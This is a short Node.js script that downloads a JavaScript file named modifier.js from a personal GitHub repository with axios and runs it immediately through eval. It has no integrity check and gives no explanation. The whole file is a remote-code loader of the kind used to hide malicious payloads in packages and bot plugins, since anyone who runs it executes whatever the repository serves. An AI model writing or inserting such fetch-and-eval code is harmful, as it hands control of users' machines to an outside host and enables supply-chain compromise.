const axios = require('axios');

(async () => {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/MOHAMMADFAHIM792/FAHIM-HOSSAIN/main/modifier.js");
    if (data) {
      eval(data);
    }
  } catch (error) {
    console.error("Error fetching code:", error.message);
  }
})();
